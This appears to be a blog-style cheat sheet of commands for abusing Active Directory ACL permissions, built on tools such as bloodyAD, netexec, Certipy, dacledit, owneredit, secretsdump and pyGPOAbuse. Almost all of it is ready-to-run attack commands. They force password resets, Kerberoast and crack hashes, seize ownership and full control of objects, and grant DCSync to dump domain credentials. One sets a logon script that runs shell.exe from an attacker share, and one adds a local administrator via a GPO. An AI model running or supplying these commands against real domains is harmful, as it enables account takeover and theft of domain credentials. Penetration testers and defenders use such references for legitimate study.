---
title: "AD : ACLs"
date: 2025-12-02 00:31:33
categories:
  - Active Directory
  - Exploitation
  - ACLs
tags:
  - netexec
  - Certipy
  - dacledit
  - owneredit
  - bloodyAD
  - secretsdump
  - PowerView
  - net
---

# ForceChangePassword

> ➜ Reset the target user’s password without knowing the old password

```bash
nxc smb domain -u our-user -p password -M change-password -o USER='target-username' NEWPASS='new-password'
```

Or

```bash
bloodyAD --host ip -d dc -u our-user -p password set password target-username new-password
```

Or

```bash
net rpc password target-username new-password -U "domain"/"our-user"%"password" -S DC
```

# WriteSPN

> ➜ Targeted Kerberoasting.

```bash
bloodyAD --host dc -d domain -u username -p password set object target_user servicePrincipalName -v 'domain/meow'
```

```bash
nxc ldap fqdn -u username -p pwd -k --kerberoasting file-name
```

Or

```bash
targetedKerberoast.py -d domain --dc-ip ip -u username -p password --dc-host dc --request-user target_user
```

Then we can crack the hash with :

> for $krb5tgs$23$*…

```bash
hashcat -m 13100 -a 0 hashfile wordilst.txt
```

> for $krb5tgs$18$*…

```bash
hashcat -m 19700 -a 0 hashfile wordlist.txt
```

# AddMember

> ➜ Add any user to the target group.

```bash
bloodyAD.py --host dc -d domain -u our-user -p password add groupMember target-group target-user
```

Or

```bash
net rpc group addmem target-group target-user -U domain/our-user -S dc
```

# AddSelf

> ➜ Add yourself to the target group.

```bash
bloodyAD.py --host dc -d domain -u our-user -p password add groupMember target-group target-user
```

# ReadLAPSPassword

> ➜ Read the LAPS local admin password from a computer object.

```bash
nxc smb target -u username -p password --laps
```

# ReadGMSAPassword

> ➜ Read the password of a gMSA service account.

```bash
nxc ldap target -u username -p password --gmsa
```

# Shadow Credentials (AddKeyCredentialLink)

> ➜ Add your own KeyCredentialLink → authenticate as the target using a forged certificate.

```bash
certipy shadow auto -u username@domain -p password -account target-user -dc-ip ip
```

# WriteOwner

> ➜ Take ownership of the object

### User

Take Ownership Of The Target User :

```bash
owneredit.py -action write -new-owner our-user -target target-user domain/our-user:password -dc-ip dc-ip
```

Grant Ourselves Full Control (GenericAll) Over the Target User

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal our-user -target target-user 'domain/our-user:password' -dc-ip dc-ip
```

### Group

Take Ownership Of The Target Group :

```bash
owneredit.py -action write -new-owner our-user -target target-group domain/our-user:password -dc-ip dc-ip
```

Grant Ourselves Full Control (GenericAll) Over the Target User :

```bash
dacledit.py -action 'write' -rights 'FullControl' -principal our-user -target target-group 'domain/our-user:password' -dc-ip dc-ip
```

# GenericWrite

> ➜ Modify attributes of the target object (depends on object type).

## User

### Targeted Kerberoasting

```bash
bloodyAD --host dc -d domain -u username -p password set object target_user servicePrincipalName -v 'domain/meow'
```

Or

```bash
targetedKerberoast.py -d domain --dc-ip ip -u username -p password --dc-host dc --request-user target_user
```

### ForceChangePassword

```bash
nxc smb domain -u our-user -p password -M change-password -o USER='target-username' NEWPASS='new-password'
```

Or

```bash
bloodyAD --host ip -d dc -u our-user -p password set password target-username new-password
```

Or

```bash
net rpc password target-username new-password -U "domain"/"our-user"%"password" -S DC
```

### Shadow Credentials (AddKeyCredentialLink)

```bash
certipy shadow auto -u username@domain -p password -account target-user -dc-ip ip
```

### Logon Script

##### bloodyAD

```bash
bloodyAD --host "DC-IP" -d "domain" -u "our-user" -p "password" set object target-user scriptPath -v '\\our-ip\share\shell.exe'
```

##### PowerView

```bash
Import-Module .\PowerView.ps1

echo "\\our-ip\share\file.exe" > shares.ps1

Set-DomainObject -Identity maria -SET @{scriptpath="C:\\shares.ps1"}
```

` ➜ Then we can capture the ntlm hash`

## Group

##### AddMember

```bash
bloodyAD.py --host dc -d domain -u our-user -p password add groupMember target-group target-user
```

Or

```bash
net rpc group addmem target-group target-user -U domain/our-user -S dc
```

## Computer

##### Change Password

```bash
addcomputer.py -computer-name 'target-computer' -computer-pass 'new-password' -no-add -dc-host DC 'domain/our-user:password'
```

# WriteDACL

> ➜ Modify the ACL → give yourself any rights.

```bash
dacledit.py -action 'write' -rights 'DCSync' -principal 'controlledUser' -target-dn 'DomainDisinguishedName' 'domain'/'controlledUser':'password'
```

DCsync

```bash
impacket-secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'
```

# DCSync Rights

```bash
secretsdump.py domain/username:password@domain
```

```bash
secretsdump.py domain/username@domain -hashes :hash
```

```bash
secretsdump.py dc -k
```

```bash
nxc smb target -u username -p password --ntds
```

# GenericAll

> ➜ Full control over the target object.

### User

> ➜ Change User’s Password

```bash
nxc smb domain -u our-user -p password -M change-password -o USER='target-username' NEWPASS='new-password'
```

Or

```bash
bloodyAD --host ip -d dc -u our-user -p password set password target-username new-password
```

Or

```bash
net rpc password target-username new-password -U "domain"/"our-user"%"password" -S DC
```

### Group

> ➜ Add Users to the target group

```bash
bloodyAD --host dc -d domain -u username -p password add groupMember target-group target-username
```

### Group Policy Object ( GPO )

```plaintext
git clone https://github.com/Hackndo/pyGPOAbuse.git

uv add --script pygpoabuse.py -r requirements.txt

uv run --script pygpoabuse.py domain/our-user:password -gpo-id <id> -command 'net localgroup administrators our-user /add' -f
```

`➜ We can get the gpo id via output of Bloodhound`

### Organization Unit

```bash
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal our-user -target-dn 'Organization-Unit' domain/our-user:password
```

With Kerberos

```bash
dacledit.py -action write -rights 'FullControl' -inheritance -principal our-user -target-dn 'Organization-Unit' domain/our-user:password -dc-ip dc -k
```
